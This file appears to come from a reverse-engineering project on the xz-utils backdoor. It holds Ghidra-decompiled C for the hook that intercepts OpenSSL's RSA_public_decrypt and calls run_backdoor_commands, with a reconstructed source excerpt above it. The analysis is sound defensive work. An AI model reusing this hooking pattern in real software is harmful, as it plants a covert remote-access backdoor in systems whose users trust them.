// /home/kali/xzre-ghidra/xzregh/10A240_hook_RSA_public_decrypt.c
// Function: hook_RSA_public_decrypt @ 0x10A240
// Calling convention: __stdcall
// Prototype: int __stdcall hook_RSA_public_decrypt(int flen, uchar * from, uchar * to, RSA * rsa, int padding)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief hook for RSA_public_decrypt, which triggers @see run_backdoor_commands
 *
 * Upstream implementation excerpt (xzre/xzre_code/hook_RSA_public_decrypt.c):
 *     int hook_RSA_public_decrypt(
 *     	int flen, unsigned char *from,
 *     	unsigned char *to, RSA *rsa, int padding
 *     ){
 *     	pfn_RSA_public_decrypt_t RSA_public_decrypt;
 *     
 *     	if(!global_ctx) return 0;
 *     	if(!global_ctx->imported_funcs) return 0;
 *     	if(!(RSA_public_decrypt=global_ctx->imported_funcs->RSA_public_decrypt)) return 0;
 *     	if(!rsa){
 *     		return RSA_public_decrypt(flen, from, to, rsa, padding);
 *     	}
 *     	BOOL call_orig = TRUE;
 *     	int result = run_backdoor_commands(rsa, global_ctx, &call_orig);
 *     	if(call_orig){
 *     		return RSA_public_decrypt(flen, from, to, rsa, padding);
 *     	}
 *     	return result;
 *     }
 */

int hook_RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,int padding)

{
  BOOL call_orig;
  int result;
  BOOL local_2c [3];
  pfn_RSA_public_decrypt_t RSA_public_decrypt;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (RSA_public_decrypt = global_ctx->imported_funcs->RSA_public_decrypt,
     RSA_public_decrypt != (pfn_RSA_public_decrypt_t)0x0)) {
    if (rsa != (RSA *)0x0) {
      local_2c[0] = 1;
      call_orig = run_backdoor_commands(rsa,global_ctx,local_2c);
      if (local_2c[0] == 0) {
        return call_orig;
      }
    }
                    /* WARNING: Could not recover jumptable at 0x0010a2bd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    result = (*RSA_public_decrypt)(flen,from,to,rsa,padding);
    return result;
  }
  return 0;
}

